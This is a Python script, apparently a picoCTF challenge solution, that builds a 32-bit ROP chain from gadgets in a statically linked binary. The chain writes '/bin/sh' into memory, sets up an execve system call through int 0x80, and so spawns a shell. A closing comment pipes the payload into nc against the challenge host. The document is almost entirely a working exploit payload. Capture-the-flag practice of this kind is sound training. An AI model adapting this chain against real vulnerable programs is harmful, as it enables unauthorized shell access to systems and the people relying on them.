from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # f11ef12d407798a76a216488079aa8f02ce7f4b90b68af3ef3750ba43893e15d
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = 'aaaabbbbccccdd'

rop += rebase_0(0x0006889a) # 0x080b089a: pop eax; ret;
rop += '//bi'
rop += rebase_0(0x00016ea9) # 0x0805eea9: pop edx; pop ebx; ret;
rop += rebase_0(0x0009f060)
rop += p(0xdeadbeef)
rop += rebase_0(0x00017be2) # 0x0805fbe2: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x0006889a) # 0x080b089a: pop eax; ret;
rop += 'n/sh'
rop += rebase_0(0x00016ea9) # 0x0805eea9: pop edx; pop ebx; ret;
rop += rebase_0(0x0009f064)
rop += p(0xdeadbeef)
rop += rebase_0(0x00017be2) # 0x0805fbe2: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x0006889a) # 0x080b089a: pop eax; ret;
rop += p(0x00000000)
rop += rebase_0(0x00016ea9) # 0x0805eea9: pop edx; pop ebx; ret;
rop += rebase_0(0x0009f068)
rop += p(0xdeadbeef)
rop += rebase_0(0x00017be2) # 0x0805fbe2: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x00001022) # 0x08049022: pop ebx; ret;
rop += rebase_0(0x0009f060)
rop += rebase_0(0x0001c371) # 0x08064371: pop ecx; add al, 0xf6; ret;
rop += rebase_0(0x0009f068)
rop += rebase_0(0x00029095) # 0x08071095: pop edx; xor eax, eax; pop edi; ret;
rop += rebase_0(0x0009f068)
rop += p(0xdeadbeef)
rop += rebase_0(0x0006889a) # 0x080b089a: pop eax; ret;
rop += p(0x0000000b)
rop += rebase_0(0x00031f00) # 0x08079f00: int 0x80; ret;
print(rop)

# (python ./ropinput.py;cat) | nc saturn.picoctf.org [PORT]